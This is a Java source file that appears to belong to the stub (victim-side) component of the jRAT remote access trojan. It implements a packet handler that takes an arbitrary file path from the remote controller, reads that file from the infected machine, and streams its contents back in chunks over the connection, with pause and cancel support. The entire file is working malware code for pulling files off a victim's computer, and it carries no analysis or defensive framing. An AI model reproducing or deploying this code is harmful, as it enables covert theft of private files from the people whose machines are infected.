package io.jrat.stub.packets.incoming;

import io.jrat.common.TransferRunnable;
import io.jrat.common.io.FileCache;
import io.jrat.common.io.TransferData;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import io.jrat.stub.packets.outgoing.Packet29ClientUploadPart;
import io.jrat.stub.packets.outgoing.Packet30BeginClientUpload;
import io.jrat.stub.packets.outgoing.Packet31CompleteClientUpload;

import java.io.File;
import java.io.FileInputStream;


public class Packet21ClientUploadFile extends AbstractIncomingPacket {

	@Override
	public void read(final Connection con) throws Exception {
		final String rawFile = con.readLine();
		final File file = new File(rawFile);

		if (file.exists() && file.isFile()) {			
			con.addToSendQueue(new Packet30BeginClientUpload(file));

			TransferData data = new TransferData();
			data.setLocalFile(file);
			data.setRunnable(new TransferRunnable(data) {
				@Override
				public void run() {
					try {			
						FileInputStream fileInput = new FileInputStream(file);
						byte[] chunk = new byte[1024 * 8];

						int read;
						while ((read = fileInput.read(chunk)) != -1) {
							if (pause) {
								try {
									Thread.sleep(Long.MAX_VALUE);
								} catch (InterruptedException e) {

								}
							}
							
							if (Thread.interrupted() || !con.isConnected()) {
								fileInput.close();
								return;
							}
							
							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(rawFile, chunk, read);
							con.addToSendQueue(packet);
						}
						fileInput.close();
						
						con.addToSendQueue(new Packet31CompleteClientUpload(rawFile));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			});
			data.start();
			
			FileCache.put(rawFile, data);
		}
	}

}
